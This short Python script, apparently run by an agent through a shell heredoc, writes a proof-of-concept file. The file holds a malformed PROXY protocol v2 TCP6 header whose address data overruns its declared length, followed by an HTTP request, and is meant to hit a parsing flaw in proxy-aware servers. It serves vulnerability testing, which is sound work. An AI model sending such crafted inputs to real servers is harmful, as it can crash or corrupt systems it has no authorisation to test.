from pathlib import Path
# Build a v2 header with TCP6 family and oversized address fields, targeting the union layout / parsing.
p=Path('/workspace/poc.bin')
sig = b'\r\n\r\n\x00\r\nQUIT\n'
# PROXY cmd_ver + TCP6 family. len=36 for IPv6 addr block.
header = sig + bytes([0x21,0x21,0x00,0x24])
header += bytes(range(1, 1+16))  # src addr
header += bytes(range(17, 17+16)) # dst addr
header += b'\x12\x34\x56\x78' * 2
http = b'GET /proxy HTTP/1.0\r\nHost: x\r\n\r\n'
p.write_bytes(header + http)
print(len(header), len(http))
PY
